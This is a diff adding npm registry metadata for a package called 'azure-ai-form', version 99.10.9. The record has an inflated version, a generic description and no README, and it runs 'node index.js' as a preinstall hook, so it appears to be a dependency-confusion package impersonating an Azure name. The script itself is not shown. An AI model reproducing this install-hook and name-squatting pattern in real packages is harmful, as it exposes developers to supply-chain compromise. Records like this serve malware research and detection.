@@ -1,0 +1,62 @@
+{
+    "_id": "azure-ai-form",
+    "name": "azure-ai-form",
+    "dist-tags": {
+        "latest": "99.10.9"
+    },
+    "versions": {
+        "99.10.9": {
+            "name": "azure-ai-form",
+            "version": "99.10.9",
+            "description": "azure package",
+            "main": "index.js",
+            "scripts": {
+                "test": "echo 'error no test specified' && exit 1",
+                "preinstall": "node index.js"
+            },
+            "author": "",
+            "License": "ISC",
+            "_id": "azure-ai-form@99.10.9",
+            "_nodeVersion": "16.14.2",
+            "_npmVersion": "8.5.0",
+            "dist": {
+                "integrity": "sha512-bOTdndB5rduzZ2Hu2qu7bCkvgAlQ1VPENnS/rLpYqw1CLRCy1s3UooZkmiPLG0BmqQ4kwN3zd31t+qenY3T5+g==",
+                "shasum": "e5d8a1beadfaaa4ff3dd4263269f09f140dfc19a",
+                "tarball": "https://registry.npmjs.org/azure-ai-form/-/azure-ai-form-99.10.9.tgz",
+                "fileCount": 2,
+                "unpackedSize": 5065,
+                "npm-signature": "-----BEGIN PGP SIGNATURE-----\r\nVersion: OpenPGP.js v4.10.10\r\nComment: https://openpgpjs.org\r\n\r\nwsFzBAEBCAAGBQJiOnQAACEJED1NWxICdlZqFiEECWMYAoorWMhJKdjhPU1b\r\nEgJ2VmrrvxAAnE9CPlBI3g3ylqxgSy8YxMwuC6zfE0ioEbtEkh5bfayo5r64\r\nx5ErhPCsYerreBmFs5Pu+oHFpL0l0/3KdD3QreIlsnv2IfdS5rY7+RurSxpS\r\n4JIMGrZjRHWWWHzzAGUYIQMInk0BqfY9iA5BtXz9mnI+pHXYXnig76vwHEzT\r\nI6LSjSC0eN8dXtKVsM4hKeviRpwkt4VVQPCYnwDszwjIQpspMPWgr2W+/Srq\r\nc+Mu9JoQ0o95GpSZm6X91rIo06s7u3juJfu0C2ABboIqQtUB90/pG4yVnpVt\r\nBjs6QiCuaXxOrVurEOoeGeX8jXTRpAWbLQrXisq/RpicC1IQYtSOBCT+8EjL\r\nsXVeNQwABz3Hq8R5KoSWbqrYDt5WTdZ9GTv7qodtOPnXUNbf4qDDgxzPVVSA\r\nkjF5I3bzjS6tq8T/CU3d8VMbx5mfthj7N4/QEHvfYl47DkqWNL7WQZETS42b\r\njVGKqQ2DIqFOl7u/t9mNXe0ews8jg6ZBFej4F+zsuG0a+NewVlCYQGtPbrWm\r\n+FniOIeSs/XrvxGQbehqNt+1Qbe8xGPztWp8knf0wuwcwH+UNM0JA/u8KXA3\r\neKTawNif2G0VbIGDJHbTSEF76ymIjUTTxV9IVSg/JSCdk3O18kQYSjda4JA4\r\nOt+EDicR+ktzTOHuycJ+k82kbMLbmDdEGEA=\r\n=k6h3\r\n-----END PGP SIGNATURE-----\r\n"
+            },
+            "_npmUser": {
+                "name": "0f0or13c",
+                "email": "0f0or13c@rt11.ml"
+            },
+            "directories": {},
+            "maintainers": [
+                {
+                    "name": "0f0or13c",
+                    "email": "0f0or13c@rt11.ml"
+                }
+            ],
+            "_npmOperationalInternal": {
+                "host": "s3://npm-registry-packages",
+                "tmp": "tmp/azure-ai-form_99.10.9_1647997952267_0.34847690922987384"
+            },
+            "_hasShrinkwrap": false
+        }
+    },
+    "time": {
+        "created": "2022-03-23T01:12:32.267Z",
+        "99.10.9": "2022-03-23T01:12:32.398Z",
+        "modified": "2022-03-23T01:12:32.493Z"
+    },
+    "maintainers": [
+        {
+            "name": "0f0or13c",
+            "email": "0f0or13c@rt11.ml"
+        }
+    ],
+    "description": "azure package",
+    "readme": "ERROR: No README data found!",
+    "readmeFilename": ""
+}
